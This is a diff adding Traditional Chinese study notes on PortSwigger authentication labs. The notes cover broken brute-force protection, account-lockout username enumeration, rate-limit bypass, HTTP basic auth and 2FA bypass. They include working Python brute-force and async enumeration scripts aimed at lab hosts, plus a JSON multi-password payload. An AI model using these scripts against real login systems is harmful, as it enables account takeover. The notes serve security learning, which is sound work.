@@ -344,6 +344,322 @@ Ref: [https://portswigger.net/web-security/authentication](https://portswigger.n
 6. 經過枚舉後取得帳號密碼為 `mysq`l/`freedom`，通過此 Lab。
 :::
 
+### 有缺陷的暴力破解防護
+
+暴力破解攻擊在成功入侵帳戶之前，極有可能涉及許多次失敗的猜測。從邏輯上來說，暴力破解防護的核心在於盡可能讓自動化過程變得困難，並減慢攻擊者嘗試登入的速度。防止暴力破解攻擊最常見的兩種方式是：
+
+* 如果遠端使用者進行過多次失敗的登入嘗試，則鎖定該使用者試圖存取的帳戶
+* 如果遠端使用者在短時間內進行過多次登入嘗試，則封鎖該使用者的 IP 位址
+
+這兩種方法都能提供不同程度的保護，但都不是無懈可擊的，特別是在使用有缺陷的邏輯實作時。
+
+例如，您有時可能會發現，如果登入失敗次數過多，您的 IP 位址會被封鎖。在某些實作中，如果該 IP 位址的擁有者成功登入，失敗嘗試次數的計數器就會重設。這意味著攻擊者只需要每隔幾次嘗試就登入自己的帳戶，就能防止達到這個限制。
+
+在這種情況下，只要在字典檔中定期加入您自己的登入憑證，就足以讓這種防護機制幾乎形同虛設。
+
+::: tip Lab: [Broken brute-force protection, IP block](https://portswigger.net/web-security/authentication/password-based/lab-broken-bruteforce-protection-ip-block)
+
+1. 寫 exploit 每嘗試兩次請求就登入一組正確的帳號密碼，直到嘗試到正確的密碼就完成此 Lab 了
+    ```python
+    import requests
+
+    def create_payload():
+        wordlist = """123456
+    password
+    12345678
+
+    ...put your passwords wordlist here...
+
+    montana
+    moon
+    moscow""".split('\n')
+
+        payload = []
+
+        index = 0
+        while (True):
+            if index % 2 == 0:
+                payload.append({
+                    'username': 'wiener',
+                    'password': 'peter'
+                })
+            payload.append({
+                'username': 'carlos',
+                'password': wordlist[index]
+            })
+            index += 1
+            if index >= len(wordlist):
+                break
+
+        return payload
+
+    def send_payload(payload):
+        url = "https://0ad8002a034cd53c81d8bbea00ef00b5.web-security-academy.net/login"
+        cookies = {
+            'session': '0bDH2G8KDHX08wQ9oeMntk29hF50QcUe',
+        }
+        for data in payload:
+            re = requests.post(url, data=data, cookies=cookies)
+            print(f"\rTrying payload: {data}, Status: {re.status_code}{" " * 20}", end="")
+            if "Incorrect password" not in re.text and "wiener" not in data['username']:
+                print(f"\nFound valid credential: {data}")
+                return
+
+    if __name__ == "__main__":
+        payload = create_payload()
+        send_payload(payload)
+    ```
+:::
+
+#### 帳戶鎖定
+
+網站嘗試防止暴力破解的其中一種方式，就是在符合特定可疑條件時鎖定帳戶，通常是達到設定的登入失敗嘗試次數。就像一般的登入錯誤一樣，伺服器回應顯示帳戶已被鎖定的訊息，也可能協助攻擊者列舉使用者名稱。
+
+::: tip Lab: [Username enumeration via account lock](https://portswigger.net/web-security/authentication/password-based/lab-username-enumeration-via-account-lock)
+
+1. 寫程式對每個使用者名稱請求五次，並請 AI 改寫成非同步增加速度：
+    ```python
+    import asyncio
+    import aiohttp
+    from typing import List
+
+    wordlist = """carlos
+    root
+    admin
+
+    ...put the usernames here...
+
+    auto
+    autodiscover""".split('\n')
+
+
+    async def test_login(session: aiohttp.ClientSession, username: str, url: str) -> None:
+        """測試單一用戶名登入"""
+        data = {
+            'username': username,
+            'password': 'test',
+        }
+        
+        try:
+            async with session.post(url, data=data) as response:
+                text = await response.text()
+                print(f"User: {username}\tStatus: {response.status}\tlength: {len(text)}")
+        except Exception as e:
+            print(f"User: {username}\tError: {e}")
+
+
+    async def run_tests(wordlist: List[str], url: str, rounds: int = 5) -> None:
+        """執行非同步測試"""
+        # 設定連接池和超時
+        timeout = aiohttp.ClientTimeout(total=10)
+        connector = aiohttp.TCPConnector(limit=50, limit_per_host=10)
+        
+        async with aiohttp.ClientSession(timeout=timeout, connector=connector) as session:
+            tasks = []
+            
+            # 建立所有任務
+            for round_num in range(rounds):
+                print(f"\n--- Round {round_num + 1} ---")
+                for username in wordlist:
+                    task = test_login(session, username, url)
+                    tasks.append(task)
+            
+            # 並發執行所有任務，但限制同時執行的數量
+            semaphore = asyncio.Semaphore(20)  # 限制同時最多20個請求
+            
+            async def limited_task(task):
+                async with semaphore:
+                    await task
+            
+            # 執行所有任務
+            await asyncio.gather(*[limited_task(task) for task in tasks])
+
+
+    async def main():
+        """主函數"""
+        url = 'https://0a45005d0321c863814516e700cb0001.web-security-academy.net/login'
+        await run_tests(wordlist, url, rounds=5)
+
+
+    if __name__ == "__main__":
+        # 執行非同步程式
+        asyncio.run(main())
+    ```
+2. 發現使用者名稱 `agenda` 的回應長度不同，猜測存在使用者名稱 `agenda`
+3. 撰寫程式嘗試各種密碼，並請 AI 改寫成非同步增加速度：
+    ```python
+    import asyncio
+    import aiohttp
+    from typing import List
+
+    wordlist = """123456
+    password
+    12345678
+    
+    ...put the passwords here...
+
+    moon
+    moscow""".split('\n')
+
+
+    async def test_password(session: aiohttp.ClientSession, password: str, url: str, username: str = 'agenda') -> None:
+        """測試單一密碼登入"""
+        data = {
+            'username': username,
+            'password': password,
+        }
+        
+        try:
+            async with session.post(url, data=data) as response:
+                text = await response.text()
+                status = response.status
+                length = len(text)
+                
+                print(f"Password: {password}\tStatus: {status}\tLength: {length}")
+                            
+        except Exception as e:
+            print(f"Password: {password}\tError: {e}")
+
+    async def run_password_tests(wordlist: List[str], url: str, rounds: int = 5, username: str = 'agenda') -> None:
+        """執行非同步密碼測試"""
+        # 設定連接池和超時
+        timeout = aiohttp.ClientTimeout(total=15)
+        connector = aiohttp.TCPConnector(
+            limit=30,           # 總連接池大小
+            limit_per_host=15,  # 每個主機的連接限制
+            ttl_dns_cache=300,  # DNS快取時間
+            use_dns_cache=True,
+        )
+        
+        async with aiohttp.ClientSession(
+            timeout=timeout, 
+            connector=connector,
+            headers={'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36'}
+        ) as session:
+            
+            for round_num in range(rounds):
+                print(f"\n=== Round {round_num + 1} ===")
+                
+                # 建立該輪的所有任務
+                tasks = []
+                for password in wordlist:
+                    task = test_password(session, password, url, username)
+                    tasks.append(task)
+                
+                # 使用信號量限制並發數
+                semaphore = asyncio.Semaphore(10)  # 同時最多10個請求
+                
+                async def limited_task(task):
+                    async with semaphore:
+                        await task
+                        # 小延遲避免過快請求
+                        await asyncio.sleep(0.1)
+                
+                # 執行該輪所有任務
+                await asyncio.gather(*[limited_task(task) for task in tasks])
+                
+                print(f"Round {round_num + 1} completed")
+
+
+    async def main():
+        """主函數"""
+        url = 'https://0a45005d0321c863814516e700cb0001.web-security-academy.net/login'
+        username = 'agenda'
+        
+        print(f"開始測試用戶 '{username}' 的密碼...")
+        print(f"總共將測試 {len(wordlist)} 個密碼，執行 5 輪")
+        
+        await run_password_tests(wordlist, url, rounds=5, username=username)
+
+
+    if __name__ == "__main__":
+        # 執行非同步程式
+        asyncio.run(main())
+4. 找到密碼 `summer` 的回應長度和其他回應長度不同。
+5. 等待一分鐘解除鎖定後，登入取得的帳號密碼完成此 Lab。
+:::
+
+鎖定帳戶對於針對特定帳戶的目標式暴力破解攻擊提供了一定程度的保護。然而，這種方法無法充分防止攻擊者只是試圖取得任何隨機帳戶存取權限的暴力破解攻擊。
+
+例如，可以使用以下方法來繞過這種防護：
+
+1. 建立一份可能有效的候選使用者名稱清單。這可以透過使用者名稱列舉，或者簡單地基於常見使用者名稱清單來達成。
+2. 決定一個非常少量的密碼候選清單，您認為至少有一個使用者可能會使用。關鍵在於，您選擇的密碼數量不得超過允許的登入嘗試次數。例如，如果您已經確定限制為 3 次嘗試，您最多只能選擇 3 個密碼猜測。
+3. 使用諸如 Burp Intruder 之類的工具，對每個候選使用者名稱嘗試每個選定的密碼。透過這種方式，您可以嘗試對每個帳戶進行暴力破解而不會觸發帳戶鎖定。您只需要一個使用者使用這三個密碼中的其中一個，就能成功入侵帳戶。
+
+帳戶鎖定也無法防護憑證填充攻擊。這種攻擊涉及使用大量的「使用者名稱：密碼」配對字典，由在資料外洩事件中竊取的真實登入憑證組成。憑證填充攻擊利用了許多人在多個網站上重複使用相同使用者名稱和密碼的事實，因此字典中的某些被入侵憑證也有可能在目標網站上有效。帳戶鎖定無法防護憑證填充攻擊，因為每個使用者名稱只會被嘗試一次。憑證填充攻擊特別危險，因為它有時可以讓攻擊者僅透過一次自動化攻擊就入侵許多不同的帳戶。
+
+#### 使用者速率限制
+
+網站嘗試防止暴力破解攻擊的另一種方式是透過使用者速率限制。在這種情況下，在短時間內進行過多的登入請求會導致您的 IP 位址被封鎖。通常，IP 位址只能透過以下其中一種方式解除封鎖：
+
+* 在經過一定時間後自動解除
+* 由管理員手動解除
+* 由使用者在成功完成驗證碼（CAPTCHA）後手動解除
+
+由於使用者速率限制較不容易出現使用者名稱列舉和拒絕服務攻擊，因此有時會優於帳戶鎖定。然而，它仍然不是完全安全的。正如我們在之前的實驗中看到的例子，攻擊者有幾種方法可以操縱其表面 IP 位址來繞過封鎖。
+
+由於限制是基於從使用者 IP 位址發送的 HTTP 請求速率，如果您能夠找出如何透過單一請求猜測多個密碼的方法，有時也可能繞過這種防護機制。
+
+::: tip Lab: [Broken brute-force protection, multiple credentials per request](https://portswigger.net/web-security/authentication/password-based/lab-broken-brute-force-protection-multiple-credentials-per-request)
+
+1. 使用使用者名稱 `carlos` 及任意使用者名稱登入。
+2. 透過 Burp Suite 的 Repeater 修改請求。
+3. 請求為 Json 格式，將 `password` 欄位放入所有的密碼。
+    ```json
+    {
+        "username" : "carlos",
+        "password" : [
+            "123456",
+            "password",
+            "qwerty"
+            ...
+            ]
+    }
+    ```
+4. 請求回應 302，在回應上方點擊右鍵選擇「Show response in browser」成功登入完成此 Lab。
+:::
+
+### HTTP 基本驗證
+
+雖然 HTTP 基本驗證相當古老，但由於其相對簡單和易於實作的特性，您有時仍會看到它被使用。在 HTTP 基本驗證中，客戶端從伺服器接收一個驗證權杖，該權杖是透過串聯使用者名稱和密碼，並使用 Base64 編碼而建構的。這個權杖由瀏覽器儲存和管理，瀏覽器會自動將其加入到後續每個請求的 `Authorization` 標頭中，如下所示：
+
+```http
+Authorization: Basic base64(username:password)
+```
+
+基於多種原因，這通常不被認為是安全的驗證方法。首先，它涉及在每個請求中重複發送使用者的登入憑證。除非網站同時實作 HSTS，否則使用者憑證容易在中間人攻擊中被擷取。
+
+此外，HTTP 基本驗證的實作通常不支援暴力破解防護。由於權杖完全由靜態值組成，這可能使其容易遭受暴力破解攻擊。
+
+HTTP 基本驗證對於工作階段相關的漏洞也特別脆弱，尤其是 CSRF，它本身無法提供任何防護。
+
+在某些情況下，利用有漏洞的 HTTP 基本驗證可能只會讓攻擊者存取看似無趣的頁面。然而，除了提供進一步的攻擊面之外，以這種方式暴露的憑證可能會在其他更機密的環境中被重複使用。
+
+## 多重要素驗證機制的漏洞（multi-factor authentication, MFA）
+
+在本節中，我們將探討多重要素驗證機制中可能出現的一些漏洞。我們也提供了數個互動式實驗來示範如何利用多重要素驗證中的這些漏洞。
+
+許多網站完全依賴使用密碼的單一要素驗證來驗證使用者身分。然而，有些網站要求使用者使用多個驗證要素來證明其身分。
+
+對大多數網站而言，驗證生物特徵要素並不實際。然而，基於**您所知道的**和**您所擁有的**雙重要素驗證（2FA）越來越常見，無論是強制性或選擇性的。這通常要求使用者輸入傳統密碼和來自其持有的頻外實體裝置的臨時驗證碼。
+
+雖然攻擊者有時可能取得單一知識型要素（如密碼），但同時從頻外來源取得另一個要素的可能性要低得多。基於這個原因，雙重要素驗證明顯比單一要素驗證更安全。然而，就像任何安全措施一樣，它的安全性只取決於其實作方式。實作不良的雙重要素驗證可能被破解，甚至完全被繞過，就像單一要素驗證一樣。
+
+同樣值得注意的是，只有透過驗證多個**不同**要素，才能獲得多重要素驗證的完整效益。以兩種不同方式驗證相同要素並非真正的雙重要素驗證。基於電子郵件的 2FA 就是一個例子。雖然使用者必須提供密碼和驗證碼，但存取驗證碼只需要他們知道電子郵件帳戶的登入憑證。因此，知識驗證要素只是被驗證了兩次。
+
+### 雙重要素驗證權杖
+
+驗證碼通常由使用者從某種實體裝置上讀取。許多高安全性網站現在為使用者提供專用裝置，例如您可能用來存取網路銀行或工作筆電的 RSA 權杖或按鍵裝置。除了專為安全性而設計外，這些專用裝置還具有直接產生驗證碼的優勢。網站使用專用的行動應用程式（如 Google Authenticator）也很常見，原因相同。
+
+另一方面，有些網站會透過簡訊將驗證碼發送到使用者的行動電話。雖然這在技術上仍然是驗證「您所擁有的」要素，但容易遭到濫用。首先，驗證碼是透過 SMS 傳輸，而不是由裝置本身產生。這為驗證碼被攔截創造了可能性。還有 SIM 卡調換的風險，攻擊者會詐欺性地取得帶有受害者電話號碼的 SIM 卡。攻擊者接著會收到所有發送給受害者的 SMS 簡訊，包括包含驗證碼的簡訊。
+
+### 繞過雙重要素驗證
+
+有時，雙重要素驗證的實作存在缺陷，嚴重到可以被完全繞過。
+
+如果使用者首先被提示輸入密碼，然後在另一個頁面上被提示輸入驗證碼，那麼使用者在輸入驗證碼之前實際上已經處於「已登入」狀態。在這種情況下，值得測試是否可以在完成第一個驗證步驟後直接跳到「僅限已登入」的頁面。偶爾，您會發現網站在載入頁面之前實際上並未檢查您是否完成了第二個步驟。
+
 ## 第三方身分驗證機制的漏洞
 
 如果你很喜歡破解身分驗證機制並且已經完成所有身分驗證的題目，你可能會像嘗試 OAuth 身分驗證的 Labs。
